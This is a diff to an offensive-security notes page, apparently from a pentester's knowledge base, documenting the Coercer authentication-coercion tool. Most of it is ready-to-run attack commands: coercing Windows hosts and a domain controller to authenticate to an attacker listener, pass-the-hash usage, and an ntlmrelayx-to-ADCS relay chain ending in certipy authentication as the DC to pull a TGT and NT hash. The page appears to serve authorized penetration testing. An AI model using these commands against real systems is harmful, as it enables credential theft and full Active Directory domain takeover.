@@ -5,7 +5,7 @@
 Automated authentication coercion tool — forces Windows hosts to authenticate to an attacker-controlled machine using MS-RPRN, MS-EFSRPC, MS-DFSNM, MS-FSRVP, and other RPC protocols. The modern successor to individual coercion exploits (PrinterBug, PetitPotam) — tries all available coercion methods in one shot. Used to capture hashes (with Responder) or relay authentication (with ntlmrelayx) from targets that wouldn't otherwise authenticate to you.
 
 **Source:** https://github.com/p0dalirius/Coercer
-**Install:** `pip install coercer` or `sudo apt install coercer`
+**Install:** `pipx install coercer` (recommended on modern Kali — PEP 668 blocks a plain system-wide `pip install`) or the author's `sudo python3 -m pip install coercer`. Not packaged in apt.
 
 ```bash
 # Coerce target to authenticate to Kali (catch with Responder/ntlmrelayx)
@@ -37,11 +37,11 @@ coercer fuzz -t <target> -l <listener-ip> -u user -p Password -d domain.local
 # Basic coercion — listener is your Kali IP (Responder running)
 coercer coerce -t 192.168.1.50 -l 192.168.1.200 -u user -p Password -d domain.local
 
-# Pass the Hash
-coercer coerce -t 192.168.1.50 -l 192.168.1.200 -u user -H :NTLMhash -d domain.local
+# Pass the Hash — flag is --hashes [LMHASH:]NTHASH (there is no -H)
+coercer coerce -t 192.168.1.50 -l 192.168.1.200 -u user --hashes :NTLMhash -d domain.local
 
 # Target multiple hosts from file
-coercer coerce -T targets.txt -l 192.168.1.200 -u user -p Password -d domain.local
+coercer coerce -f targets.txt -l 192.168.1.200 -u user -p Password -d domain.local
 
 # Specific coercion method only
 coercer coerce -t 192.168.1.50 -l 192.168.1.200 -u user -p Password -d domain.local \
@@ -60,7 +60,7 @@ coercer coerce -t 192.168.1.50 -l 192.168.1.200 -u user -p Password -d domain.lo
 coercer scan -t 192.168.1.50 -u user -p Password -d domain.local
 
 # Multiple targets
-coercer scan -T targets.txt -u user -p Password -d domain.local
+coercer scan -f targets.txt -u user -p Password -d domain.local
 
 # Export to JSON
 coercer scan -t 192.168.1.50 -u user -p Password -d domain.local --export-json scan.json
@@ -129,9 +129,13 @@ ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support \
 coercer coerce -t dc01.domain.local -l KALI-IP -u user -p Password -d domain.local \
   --filter-method-name MS-EFSRPC
 
-# Certificate issued → authenticate as DC
+# ntlmrelayx --adcs prints the issued cert as a base64-encoded PFX (it does NOT
+# write dc01.pfx for you). Decode it, then auth as the DC to pull a TGT + NT hash:
+echo -n '<BASE64_PFX_FROM_RELAY>' | base64 -d > dc01.pfx
 certipy auth -pfx dc01.pfx -dc-ip 192.168.1.1
 ```
+
+> [!tip] Full ESC8 relay walkthrough lives in [[Services/Active Directory/ADCS|ADCS]]; this note only covers the coercion half.
 
 ---
 
@@ -144,6 +148,10 @@ certipy auth -pfx dc01.pfx -dc-ip 192.168.1.1
 
 ---
 
+> [!note] **See also** — Individual coercion primitives Coercer bundles: [[Tools/Lateral Movement/PrinterBug|PrinterBug]] (MS-RPRN), [[Tools/Lateral Movement/PetitPotam|PetitPotam]] (MS-EFSRPC). Catch/relay the forced auth with [[Tools/Lateral Movement/responder|Responder]] or [[Tools/Lateral Movement/ntlmrelayx|ntlmrelayx]]; ADCS ESC8 chain in [[Services/Active Directory/ADCS|ADCS]] (cert → TGT via [[Tools/AD/Certipy|Certipy]]). Protocol background: [[Standards & Protocols/NTLM|NTLM]] (why relay/coercion works).
+
+---
+
 *Created: 2026-03-06*
-*Updated: 2026-03-06*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-28*
+*Model: claude-opus-5*
